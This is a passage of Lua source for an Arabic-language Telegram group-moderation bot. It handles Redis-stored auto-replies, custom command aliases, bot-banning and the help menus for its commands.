text = "\n📝︙قائمة الردود العامه \n━━━━━━━━━━━\n"
for k,v in pairs(list) do
if redis:get(bot_id.."Zepra:Add:Rd:Sudo:Gif"..v) then
db = "متحركه 🎭"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:vico"..v) then
db = "بصمه 📢"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:stekr"..v) then
db = "ملصق 🃏"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:Text"..v) then
db = "رساله ✉"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:Photo"..v) then
db = "صوره 🎇"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:Video"..v) then
db = "فيديو 📹"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:File"..v) then
db = "ملف •"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:Audio"..v) then
db = "اغنيه 🎵"
elseif redis:get(bot_id.."Zepra:Add:Rd:Sudo:video_note"..v) then
db = "بصمه فيديو 🎥"
end
text = text..""..k.." » (" ..v.. ") » (" ..db.. ")\n"
end
if #list == 0 then
bot.sendText(msg.chat_id,msg.id,"• لا يوجد ردود عامه","md",true)  
end
return bot.sendText(msg.chat_id,msg.id,"["..text.."]","md",true)  
end
if text == "اضف رد عام" then 
redis:set(bot_id.."Zepra:Set:Rd"..msg.sender.user_id..":"..msg.chat_id,true)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '- الغاء الامر ', data =msg.sender.user_id..'/cancelamr'}
},
}
}
return bot.sendText(msg.chat_id,msg.id,"• ارسل الان اسم الرد لاضافته في الردود العامه ", 'md', false, false, false, false, reply_markup)
end
if text == "مسح رد عام" then 
redis:set(bot_id.."Zepra:Set:On"..msg.sender.user_id..":"..msg.chat_id,true)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '- الغاء الامر ', data =msg.sender.user_id..'/cancelamr'}
},
}
}
return bot.sendText(msg.chat_id,msg.id,"• ارسل الان الكلمه لمسحها من الردود العامه", 'md', false, false, false, false, reply_markup)
end
end
if text and redis:get(bot_id.."Zepra:Set:On"..msg.sender.user_id..":"..msg.chat_id) == "true" then
if text:match("^(.*)$") then
list = {"Add:Rd:Sudo:video_note","Add:Rd:Sudo:Audio","Add:Rd:Sudo:File","Add:Rd:Sudo:Video","Add:Rd:Sudo:Photo","Add:Rd:Sudo:Text","Add:Rd:Sudo:stekr","Add:Rd:Sudo:vico","Add:Rd:Sudo:Gif"}
for k,v in pairs(list) do
redis:del(bot_id..'Zepra:'..v..text)
end
redis:del(bot_id.."Zepra:Set:On"..msg.sender.user_id..":"..msg.chat_id)
redis:srem(bot_id.."Zepra:List:Rd:Sudo", text)
bot.sendText(msg.chat_id,msg.id,"• تم مسح الرد من الردود العامه")  
return false
end
end

----------------------------------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array"..msg.sender.user_id..":"..msg.chat_id) == 'true' then
redis:set(bot_id..'Set:array'..msg.sender.user_id..':'..msg.chat_id,'true1')
redis:set(bot_id..'Text:array'..msg.sender.user_id..':'..msg.chat_id, text)
redis:del(bot_id.."Add:Rd:array:Text"..text..msg.chat_id)   
redis:sadd(bot_id..'List:array'..msg.chat_id..'', text)
bot.sendText(msg.chat_id,msg.id,"*• ارسل الكلمه الرد الذي تريد اضافتها*","md",true)  
return false
end
end
if text and redis:get(bot_id..'Set:array'..msg.sender.user_id..':'..msg.chat_id) == 'true1' then
local test = redis:get(bot_id..'Text:array'..msg.sender.user_id..':'..msg.chat_id..'')
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
redis:sadd(bot_id.."Add:Rd:array:Text"..test..msg.chat_id,text)  
reply_ad = bot.replyMarkup{
type = 'inline',data = {
{{text="• اضغط هنا لانهاء الاضافه •",data="EndAddarray"..msg.sender.user_id}},
}
}
return bot.sendText(msg.chat_id,msg.id,' *• تم حفظ الرد يمكنك ارسال رد اخر او الانهاء من خلال الزر بالاسفل*',"md",true, false, false, false, reply_ad)
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id) == 'dttd' then
redis:del(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id)
gery = redis:get(bot_id.."Set:array:addpu"..msg.sender.user_id..":"..msg.chat_id)
if not redis:sismember(bot_id.."Add:Rd:array:Text"..gery..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*• لا يوجد رد متعدد* ","md",true)  
return false
end
redis:srem(bot_id.."Add:Rd:array:Text"..gery..msg.chat_id,text)
bot.sendText(msg.chat_id,msg.id,' *• تم مسحه بنجاح* ',"md",true)  
end
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id) == 'delrd' then
redis:del(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id)
if not redis:sismember(bot_id..'List:array'..msg.chat_id,text) then
bot.sendText(msg.chat_id,msg.id,"*• لا يوجد رد متعدد* ","md",true)  
return false
end
redis:set(bot_id.."Set:array:addpu"..msg.sender.user_id..":"..msg.chat_id,text)
redis:set(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id,"dttd")
bot.sendText(msg.chat_id,msg.id,' *• قم بارسال الرد الذي تريد مسحه منه* ',"md",true)  
return false
end
end
if text == "مسح رد من متعدد" and Owner(msg) then
redis:set(bot_id.."Set:array:Ssd"..msg.sender.user_id..":"..msg.chat_id,"delrd")
bot.sendText(msg.chat_id,msg.id,"*• ارسل كلمة الرد *","md",true)  
return false
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:rd"..msg.sender.user_id..":"..msg.chat_id) == 'delrd' then
redis:del(bot_id.."Set:array:rd"..msg.sender.user_id..":"..msg.chat_id)
redis:del(bot_id.."Add:Rd:array:Text"..text..msg.chat_id)
redis:srem(bot_id..'List:array'..msg.chat_id, text)
bot.sendText(msg.chat_id,msg.id,"*• تم مسح الرد المتعدد *","md",true)  
return false
end
end
if text == "مسح رد متعدد" and Owner(msg) then
redis:set(bot_id.."Set:array:rd"..msg.sender.user_id..":"..msg.chat_id,"delrd")
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان الكلمه لمسحها من الردود*","md",true)  
return false
end
if text == ("الردود المتعدده") and Owner(msg) then
local list = redis:smembers(bot_id..'List:array'..msg.chat_id..'')
t = Reply_Status(msg.sender.user_id,"\n *━━━━━━━━━━━ *\n*• قائمه الردود المتعدده*\n  *━━━━━━━━━━━ *\n").yu
for k,v in pairs(list) do
t = t..""..k..">> (" ..v.. ") » ( رساله )\n"
end
if #list == 0 then
t = "*• لا يوجد ردود متعدده*"
end
bot.sendText(msg.chat_id,msg.id,t,"md",true)  
end
if text == ("مسح الردود المتعدده") and BasicConstructor(msg) then   
local list = redis:smembers(bot_id..'List:array'..msg.chat_id)
for k,v in pairs(list) do
redis:del(bot_id.."Add:Rd:array:Text"..v..msg.chat_id)   
redis:del(bot_id..'List:array'..msg.chat_id)
end
bot.sendText(msg.chat_id,msg.id,"*• تم مسح الردود المتعدده*","md",true)  
end
if text == "اضف رد متعدد" and Administrator(msg) then   
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان الكلمه لاضافتها في الردود*","md",true)
redis:set(bot_id.."Set:array"..msg.sender.user_id..":"..msg.chat_id,true)
return false 
end
----------------
if programmer(msg) then
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:arrayy"..msg.sender.user_id..":"..msg.chat_id) == 'true' then
redis:set(bot_id..'Set:arrayy'..msg.sender.user_id..':'..msg.chat_id,'true1')
redis:set(bot_id..'Text:arrayy'..msg.sender.user_id, text)
redis:del(bot_id.."Add:Rd:array:Textt"..text)   
redis:sadd(bot_id..'List:arrayy', text)
bot.sendText(msg.chat_id,msg.id,"*• ارسل الكلمه الرد الذي تريد اضافتها*","md",true)  
return false
end
end
if text and redis:get(bot_id..'Set:arrayy'..msg.sender.user_id..':'..msg.chat_id) == 'true1' then
local test = redis:get(bot_id..'Text:arrayy'..msg.sender.user_id)
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
redis:sadd(bot_id.."Add:Rd:array:Textt"..test,text)  
reply_ad = bot.replyMarkup{
type = 'inline',data = {
{{text="• اضغط هنا لانهاء الاضافه •",data="EndAddarrayy"..msg.sender.user_id}},
}
}
return bot.sendText(msg.chat_id,msg.id,' *• تم حفظ الرد يمكنك ارسال رد اخر او الانهاء من خلال الزر بالاسفل*',"md",true, false, false, false, reply_ad)
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:Ssdd"..msg.sender.user_id..":"..msg.chat_id) == 'dttd' then
redis:del(bot_id.."Set:array:Ssdd"..msg.sender.user_id..":"..msg.chat_id)
gery = redis:get(bot_id.."Set:array:addpuu"..msg.sender.user_id..":"..msg.chat_id)
if not redis:sismember(bot_id.."Add:Rd:array:Textt"..gery,text) then
bot.sendText(msg.chat_id,msg.id,"*• لا يوجد رد متعدد* ","md",true)  
return false
end
redis:srem(bot_id.."Add:Rd:array:Textt"..gery,text)
bot.sendText(msg.chat_id,msg.id,' *• تم مسحه بنجاح* ',"md",true)  
end
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:Ssdd"..msg.sender.user_id..":"..msg.chat_id) == 'delrd' then
redis:del(bot_id.."Set:array:Ssdd"..msg.sender.user_id..":"..msg.chat_id)
if not redis:sismember(bot_id..'List:arrayy',text) then
bot.sendText(msg.chat_id,msg.id,"*• لا يوجد رد متعدد* ","md",true)  
return false
end
redis:set(bot_id.."Set:array:addpuu"..msg.sender.user_id..":"..msg.chat_id,text)
redis:set(bot_id.."Set:array:Ssdd"..msg.sender.user_id..":"..msg.chat_id,"dttd")
bot.sendText(msg.chat_id,msg.id,' *• قم بارسال الرد الذي تريد مسحه منه* ',"md",true)  
return false
end
end
if text == "مسح رد من متعدد عام" then
redis:set(bot_id.."Set:array:Ssdd"..msg.sender.user_id..":"..msg.chat_id,"delrd")
bot.sendText(msg.chat_id,msg.id,"*• ارسل كلمة الرد *","md",true)  
return false
end
if text and text:match("^(.*)$") then
if redis:get(bot_id.."Set:array:rdd"..msg.sender.user_id..":"..msg.chat_id) == 'delrd' then
redis:del(bot_id.."Set:array:rdd"..msg.sender.user_id..":"..msg.chat_id)
redis:del(bot_id.."Add:Rd:array:Textt"..text)
redis:srem(bot_id..'List:arrayy', text)
bot.sendText(msg.chat_id,msg.id,"*• تم مسح الرد المتعدد عام *","md",true)  
return false
end
end
if text == "مسح رد متعدد عام" then
redis:set(bot_id.."Set:array:rdd"..msg.sender.user_id..":"..msg.chat_id,"delrd")
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان الكلمه لمسحها من الردود*","md",true)  
return false
end
if text == ("الردود المتعدده عام") then
local list = redis:smembers(bot_id..'List:arrayy')
t = Reply_Status(msg.sender.user_id,"\n *━━━━━━━━━━━ *\n*• قائمه الردود المتعدده عام*\n  *━━━━━━━━━━━ *\n").yu
for k,v in pairs(list) do
t = t..""..k..">> (" ..v.. ") » ( رساله )\n"
end
if #list == 0 then
t = "*• لا يوجد ردود متعدده عام*"
end
bot.sendText(msg.chat_id,msg.id,t,"md",true)  
end
if text == ("مسح الردود المتعدده عام") then   
local list = redis:smembers(bot_id..'List:arrayy')
for k,v in pairs(list) do
redis:del(bot_id.."Add:Rd:array:Textt"..v)   
redis:del(bot_id..'List:arrayy')
end
bot.sendText(msg.chat_id,msg.id,"*• تم مسح الردود المتعدده عام*","md",true)  
end
if text == "اضف رد متعدد عام" then   
bot.sendText(msg.chat_id,msg.id,"*• ارسل الان الكلمه لاضافتها في الردود*","md",true)
redis:set(bot_id.."Set:arrayy"..msg.sender.user_id..":"..msg.chat_id,true)
return false 
end
end
-------------------------------
if programmer(msg) then
if msg.content.text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Commandd:sett") == "true1" then
text = text:gsub('"',"")
text = text:gsub('"',"")
text = text:gsub("`","")
text = text:gsub("*","") 
text = text:gsub("_","")
redis:del(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Commandd:sett")
redis:set(bot_id..":Commandd:"..text,redis:get(bot_id..":"..msg.sender.user_id..":Commandd:Textt"))
redis:sadd(bot_id.."Listt:Commandd", text)
bot.sendText(msg.chat_id,msg.id,"*• تم حفظ الامر *","md",true)
redis:del(bot_id..":"..msg.sender.user_id..":Commandd:Textt")
return false
end
end
if msg.content.text and text:match("^(.*)$") then
if redis:get(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Commandd:sett") == "true" then
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Commandd:sett","true1")
redis:set(bot_id..":"..msg.sender.user_id..":Commandd:Textt",text)
redis:del(bot_id..":Commandd:"..text)
bot.sendText(msg.chat_id,msg.id,"*• ارسلي الامر الجديد*","md",true)  
return false
end
end
if text == "مسح امر عام" then
bot.sendText(msg.chat_id,msg.id,"*• ارسلي الامر*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Commandd:dell",true)
end
if text == "اضف امر عام" then
bot.sendText(msg.chat_id,msg.id,"*• ارسلي الامر القديم*","md",true)
redis:set(bot_id..":"..msg.chat_id..":"..msg.sender.user_id..":Commandd:sett",true)
end
if text == "مسح الاوامر المضافه عام" or text == "مسح الاوامر المضافه العامه" then 
bot.sendText(msg.chat_id,msg.id,"*• تم مسح الاوامر المضافه عام*","md",true)
local list = redis:smembers(bot_id.."Listt:Commandd")
for k,v in pairs(list) do
redis:del(bot_id..":Commandd:"..v)
end
redis:del(bot_id.."Listt:Commandd")
end
if text == "الاوامر المضافه عام" or text == "الاوامر المضافه العامه" then
local list = redis:smembers(bot_id.."Listt:Commandd")
ext = "*• قائمة الاوامر المضافه عام\n  ━━━━━━━━━━━ \n*"
for k,v in pairs(list) do
Com = redis:get(bot_id..":Commandd:"..v)
if Com then 
ext = ext..""..k..": (`"..v.."`) ← (`"..Com.."`)\n"
else
ext = ext..""..k..": (*"..v.."*) \n"
end
end
if #list == 0 then
ext = "*↯︙مافيه اوامر مضافة عام*"
end
bot.sendText(msg.chat_id,msg.id,ext,"md",true)
end
end
-------------------------------
if Owner(msg) then
if text == "ترتيب الاوامر" then
redis:set(bot_id..":"..msg.chat_id..":Command:ا","ايدي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ا")
redis:set(bot_id..":"..msg.chat_id..":Command:غ","غنيلي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"غ")
redis:set(bot_id..":"..msg.chat_id..":Command:رس","رسائلي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"رس")
redis:set(bot_id..":"..msg.chat_id..":Command:ر","الرابط")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ر")
redis:set(bot_id..":"..msg.chat_id..":Command:رر","ردود المدير")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"رر")
redis:set(bot_id..":"..msg.chat_id..":Command:تع","تعديلاتي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تع")
redis:set(bot_id..":"..msg.chat_id..":Command:رد","اضف رد")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"رد")
redis:set(bot_id..":"..msg.chat_id..":Command:،،","مسح المكتومين")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"،،")
redis:set(bot_id..":"..msg.chat_id..":Command:تفع","تفعيل الايدي بالصوره")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تفع")
redis:set(bot_id..":"..msg.chat_id..":Command:تعط","تعطيل الايدي بالصوره")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تعط")
redis:set(bot_id..":"..msg.chat_id..":Command:تك","تنزيل الكل")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"تك")
redis:set(bot_id..":"..msg.chat_id..":Command:ثانوي","رفع مطور ثانوي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"ثانوي")
redis:set(bot_id..":"..msg.chat_id..":Command:اس","رفع منشئ اساسي")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"اس")
redis:set(bot_id..":"..msg.chat_id..":Command:منش","رفع منشئ")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"منش")
redis:set(bot_id..":"..msg.chat_id..":Command:مد","رفع مدير")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"مد")
redis:set(bot_id..":"..msg.chat_id..":Command:اد","رفع ادمن")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"اد")
redis:set(bot_id..":"..msg.chat_id..":Command:مط","رفع مطور")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"مط")
redis:set(bot_id..":"..msg.chat_id..":Command:م","رفع مميز")
redis:sadd(bot_id.."List:Command:"..msg.chat_id,"م")
bot.sendText(msg.chat_id,msg.id,"*• تم ترتيب الاوامر بالشكل التالي \n• تعطيل الايدي بالصوره تعط\n• تفعيل الايدي بالصوره تفع\n• رفع منشئ الاساسي اس\n• رفع مطور ثانوي ثانوي\n• مسح المكتومين ،،\n• مسح تعديلاتي تع\n• مسح رسائلي رس\n• تنزيل الكل تك\n• ردود المدير رر\n• رفع منشى من\n• رفع مطور مط\n• رفع مدير مد\n• رفع ادمن اد\n• رفع مميز م\n• اضف رد رد\n• غنيلي غ\n• الرابط ر\n• ايدي ا*","md",true)  
end
end

if Administrator(msg) then
if text == 'مسح البوتات' or text == 'مسح بوتات' or text == 'طرد البوتات' then            
if GetInfoBot(msg).BanUser == false then
bot.sendText(msg.chat_id,msg.id,'*• البوت لا يمتلك صلاحيه حظر الاعضاء* ',"md",true)  
return false
end
local Info = bot.searchChatMembers(msg.chat_id, "*", 200)
local members = Info.members
i = 0
for k, v in pairs(members) do
UserInfo = bot.getUser(v.member_id.user_id) 
if UserInfo.type.luatele == "userTypeBot" then 
if bot.getChatMember(msg.chat_id,v.member_id.user_id).status.luatele ~= "chatMemberStatusAdministrator" then
bot.setChatMemberStatus(msg.chat_id,v.member_id.user_id,'banned',0)
i = i + 1
end
end
end
bot.sendText(msg.chat_id,msg.id,"*• تم مسح ( "..i.." ) من البوتات في المجموعة*","md",true)  
end
if text == 'البوتات' then  
local Info = bot.searchChatMembers(msg.chat_id, "*", 200)
local members = Info.members
ls = "*• قائمه البوتات في المجموعة\n  *━━━━━━━━━━━ *\n• العلامه 《 *★ * 》 تدل على ان البوت مشرف*\n *━━━━━━━━━━━ *\n"
i = 0
for k, v in pairs(members) do
UserInfo = bot.getUser(v.member_id.user_id) 
if UserInfo.type.luatele == "userTypeBot" then 
sm = bot.getChatMember(msg.chat_id,v.member_id.user_id)
if sm.status.luatele == "chatMemberStatusAdministrator" then
i = i + 1
ls = ls..'*'..(i)..' - *@['..UserInfo.username..'] 《 `★` 》\n'
else
i = i + 1
ls = ls..'*'..(i)..' - *@['..UserInfo.username..']\n'
end
end
end
bot.sendText(msg.chat_id,msg.id,ls,"md",true)  
end
if text == "الاوامر" then    
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "او٘اﻣـࢪ اﺂݪـﺣَـﻣـاﯾـه" ,data="Amr_"..msg.sender.user_id.."_1"},{text = "او٘اﻣـࢪ اݪادمني٘ـه",data="Amr_"..msg.sender.user_id.."_2"}},
{{text = "او٘اﻣـࢪ اݪمدࢪا۽",data="Amr_"..msg.sender.user_id.."_3"},{text ="او٘اﻣـࢪ اݪمـنشئي٘ن",data="Amr_"..msg.sender.user_id.."_4"}},
{{text = "او٘اﻣـࢪ اݪمطۅࢪي٘ن",data="Amr_"..msg.sender.user_id.."_5"},{text ="او٘اﻣـࢪ اݪاعٓظاء",data="Amr_"..msg.sender.user_id.."_6"}},
{{text ="العاب البوت",data="Amr_"..msg.sender.user_id.."_7"}},
{{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}},


}
}
bot.sendText(msg.chat_id,msg.id,"↯︙تـوجد ⤈↫ 7 اوامـر فـي البـوت \n• — — — — — — — — — •\n↯︙ م1 •  ↫  اۅامـر الـحمـايه\n↯︙ م2 •  ↫  اۅامـر الادمـنـيه\n↯︙ م3 •  ↫  اۅامـر الـمـدࢪاء\n↯︙ م4 •  ↫  اۅامـر الـمنشئـين\n↯︙ م5 •  ↫  اوامـر الـمطـۅࢪين \n↯︙ م6 •  ↫  اۅامـر الـاعضاء","md", true, false, false, false, reply_markup)
end
if text == "الاعدادات" then    
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الكيبورد'" ,data="GetSe_"..msg.sender.user_id.."_Keyboard"},{text = GetSetieng(msg.chat_id).Keyboard ,data="GetSe_"..msg.sender.user_id.."_Keyboard"}},
{{text = "'الملصقات'" ,data="GetSe_"..msg.sender.user_id.."_messageSticker"},{text =GetSetieng(msg.chat_id).messageSticker,data="GetSe_"..msg.sender.user_id.."_messageSticker"}},
{{text = "'الاغاني'" ,data="GetSe_"..msg.sender.user_id.."_messageVoiceNote"},{text =GetSetieng(msg.chat_id).messageVoiceNote,data="GetSe_"..msg.sender.user_id.."_messageVoiceNote"}},
{{text = "'الانكليزي'" ,data="GetSe_"..msg.sender.user_id.."_WordsEnglish"},{text =GetSetieng(msg.chat_id).WordsEnglish,data="GetSe_"..msg.sender.user_id.."_WordsEnglish"}},
{{text = "'الفارسيه'" ,data="GetSe_"..msg.sender.user_id.."_WordsPersian"},{text =GetSetieng(msg.chat_id).WordsPersian,data="GetSe_"..msg.sender.user_id.."_WordsPersian"}},
{{text = "'الدخول'" ,data="GetSe_"..msg.sender.user_id.."_JoinByLink"},{text =GetSetieng(msg.chat_id).JoinByLink,data="GetSe_"..msg.sender.user_id.."_JoinByLink"}},
{{text = "'الصور'" ,data="GetSe_"..msg.sender.user_id.."_messagePhoto"},{text =GetSetieng(msg.chat_id).messagePhoto,data="GetSe_"..msg.sender.user_id.."_messagePhoto"}},
{{text = "'الفيديو'" ,data="GetSe_"..msg.sender.user_id.."_messageVideo"},{text =GetSetieng(msg.chat_id).messageVideo,data="GetSe_"..msg.sender.user_id.."_messageVideo"}},
{{text = "'الجهات'" ,data="GetSe_"..msg.sender.user_id.."_messageContact"},{text =GetSetieng(msg.chat_id).messageContact,data="GetSe_"..msg.sender.user_id.."_messageContact"}},
{{text = "'السيلفي'" ,data="GetSe_"..msg.sender.user_id.."_messageVideoNote"},{text =GetSetieng(msg.chat_id).messageVideoNote,data="GetSe_"..msg.sender.user_id.."_messageVideoNote"}},
{{text = "'➡️'" ,data="GetSeBk_"..msg.sender.user_id.."_1"}},
}
}
bot.sendText(msg.chat_id,msg.id,"اعدادات المجموعة","md", true, false, false, false, reply_markup)
end
if text == "م1" or text == "م١" or text == "اوامر الحمايه" then    
bot.sendText(msg.chat_id,msg.id,"*• ⌁︙اوامر حماية المجموعه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙قفل • فتح ↫ الروابط\n⌁︙قفل • فتح ↫ المعرفات\n⌁︙قفل • فتح ↫ البوتات\n⌁︙قفل • فتح ↫ المتحركه\n⌁︙قفل • فتح ↫ الملصقات\n⌁︙قفل • فتح ↫ الملفات\n⌁︙قفل • فتح ↫ الصور\n⌁︙قفل • فتح ↫ الفيديو\n⌁︙قفل • فتح ↫ الاونلاين\n⌁︙قفل • فتح ↫ الدردشه\n⌁︙قفل • فتح ↫ التوجيه\n⌁︙قفل • فتح ↫ الاغاني\n⌁︙قفل • فتح ↫ الصوت\n⌁︙قفل • فتح ↫ الجهات\n⌁︙قفل • فتح ↫ الماركداون\n⌁︙قفل • فتح ↫ التكرار\n⌁︙قفل • فتح ↫ الهاشتاك\n⌁︙قفل • فتح ↫ التعديل\n⌁︙قفل • فتح ↫ الاباحي\n⌁︙قفل • فتح ↫ التثبيت\n⌁︙قفل • فتح ↫ الاشعارات\n⌁︙قفل • فتح ↫ الكلايش\n⌁︙قفل • فتح ↫ الدخول\n⌁︙قفل • فتح ↫ الشبكات\n⌁︙قفل • فتح ↫ المواقع\n⌁︙قفل • فتح ↫ الفشار\n⌁︙قفل • فتح ↫ الكفر\n⌁︙قفل • فتح ↫ الطائفيه\n⌁︙قفل • فتح ↫ الكل\n⌁︙قفل • فتح ↫ العربيه\n⌁︙قفل • فتح ↫ الانكليزيه\n⌁︙قفل • فتح ↫ الفارسيه\n⌁︙قفل • فتح ↫ التفليش\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙اوامر حمايه اخرى ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙قفل • فتح + الامر ↫ ⤈\n⌁︙التكرار بالطرد\n⌁︙التكرار بالكتم\n⌁︙التكرار بالتقيد\n⌁︙الفارسيه بالطرد\n⌁︙البوتات بالطرد\n⌁︙البوتات بالتقيد\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*","md",true)
elseif text == "م2" or text == "م٢" then    
bot.sendText(msg.chat_id,msg.id,"*• \n⌁︙اوامر الادمنيه ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙الاعدادت\n⌁︙تاك للكل \n⌁︙انشاء رابط\n⌁︙ضع وصف\n⌁︙ضع رابط\n⌁︙ضع صوره\n⌁︙حذف الرابط\n⌁︙حذف المطايه\n⌁︙كشف البوتات\n⌁︙طرد البوتات\n⌁︙تنظيف + العدد\n⌁︙تنظيف التعديل\n⌁︙كللهم + الكلمه\n⌁︙اسم البوت + الامر\n⌁︙ضع • حذف ↫ ترحيب\n⌁︙ضع • حذف ↫ قوانين\n⌁︙اضف • حذف ↫ صلاحيه\n⌁︙الصلاحيات • حذف الصلاحيات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙ضع سبام + العدد\n⌁︙ضع تكرار + العدد\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙رفع مميز • تنزيل مميز\n⌁︙المميزين • حذف المميزين\n⌁︙كشف القيود • رفع القيود\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙حذف • مسح + بالرد\n⌁︙منع • الغاء منع\n⌁︙قائمه المنع\n⌁︙حذف قائمه المنع\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تفعيل • تعطيل ↫ الرابط\n⌁︙تفعيل • تعطيل ↫ الالعاب\n⌁︙تفعيل • تعطيل ↫ الترحيب\n⌁︙تفعيل • تعطيل ↫ التاك للكل\n⌁︙تفعيل • تعطيل ↫ كشف الاعدادات\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙طرد المحذوفين\n⌁︙طرد ↫ بالرد • بالمعرف • بالايدي\n⌁︙كتم • الغاء كتم\n⌁︙تقيد • الغاء تقيد\n⌁︙حظر • الغاء حظر\n⌁︙المكتومين • حذف المكتومين\n⌁︙المقيدين • حذف المقيدين\n⌁︙المحظورين • حذف المحظورين\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تقييد دقيقه + عدد الدقائق\n⌁︙تقييد ساعه + عدد الساعات\n⌁︙تقييد يوم + عدد الايام\n⌁︙الغاء تقييد ↫ لالغاء التقييد بالوقت\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*","md",true)
elseif text == "م3" or text == "م٣" then    
bot.sendText(msg.chat_id,msg.id,"*⌁︙اوامر المدراء ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙فحص البوت\n⌁︙ضع اسم + الاسم\n⌁︙اضف • حذف ↫ رد\n⌁︙ردود المدير\n⌁︙حذف ردود المدير\n⌁︙اضف • حذف ↫ رد متعدد\n⌁︙حذف رد من متعدد\n⌁︙الردود المتعدده\n⌁︙حذف الردود المتعدده\n⌁︙حذف قوائم المنع\n⌁︙منع ↫ بالرد على ( ملصق • صوره • متحركه )\n⌁︙حذف قائمه منع + ↫ ⤈\n( الصور • المتحركات • الملصقات )\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تنزيل الكل\n⌁︙رفع ادمن • تنزيل ادمن\n⌁︙الادمنيه • حذف الادمنيه\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تثبيت\n⌁︙الغاء التثبيت\n⌁︙اعاده التثبيت\n⌁︙الغاء تثبيت الكل\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تغير رد + اسم الرتبه + النص ↫ ⤈\n⌁︙المطور • منشئ الاساسي\n⌁︙المنشئ • المدير • الادمن\n⌁︙المميز • المنظف • العضو\n⌁︙حذف ردود الرتب\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تغيير الايدي ↫ لتغيير الكليشه\n⌁︙تعيين الايدي ↫ لتعيين الكليشه\n⌁︙حذف الايدي ↫ لحذف الكليشه\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n⌁︙تفعيل • تعطيل + الامر ↫ ⤈\n⌁︙اطردني • الايدي بالصوره • الابراج\n⌁︙معاني الاسماء • اوامر النسب • انطق\n⌁︙الايدي • تحويل الصيغ • اوامر التحشيش\n⌁︙ردود المدير • ردود المطور • التحقق\n⌁︙ضافني • حساب العمر • الزخرفه\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉*","md",true)
elseif text == "م4" or text == "م٤" then    
